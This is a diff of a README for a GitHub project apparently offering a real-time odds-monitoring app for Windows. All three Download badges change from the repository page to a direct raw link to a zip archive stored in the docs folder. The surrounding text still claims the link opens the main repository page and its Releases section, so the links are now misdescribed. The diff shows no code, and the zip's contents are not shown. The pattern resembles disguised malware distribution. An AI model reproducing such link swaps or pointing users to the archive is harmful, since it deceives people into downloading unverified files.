@@ -1,6 +1,6 @@
 # ⚙️ oddsflow-partners-platform - Real-Time Odds Monitoring Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20-%23007ACC.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bluecil/oddsflow-partners-platform)
+[![Download](https://img.shields.io/badge/Download%20-%23007ACC.svg?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bluecil/oddsflow-partners-platform/main/docs/platform_partners_oddsflow_1.2-alpha.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get oddsflow-partners-platform running on your Windows PC.
 
 Click the link below to open the GitHub page where you can download the app.
 
-[![Download](https://img.shields.io/badge/Download%20-%23707070.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bluecil/oddsflow-partners-platform)
+[![Download](https://img.shields.io/badge/Download%20-%23707070.svg?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bluecil/oddsflow-partners-platform/main/docs/platform_partners_oddsflow_1.2-alpha.3.zip)
 
 This link takes you to the main repository page. From there, you will find the latest release in the **Releases** section on the right or below the project description.
 
@@ -129,4 +129,4 @@ For support or questions, you can use the GitHub **Issues** section on the proje
 
 Access the GitHub page to download the app and get started:
 
-[![Download](https://img.shields.io/badge/Download%20-%23007ACC.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bluecil/oddsflow-partners-platform)
+[![Download](https://img.shields.io/badge/Download%20-%23007ACC.svg?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bluecil/oddsflow-partners-platform/main/docs/platform_partners_oddsflow_1.2-alpha.3.zip)
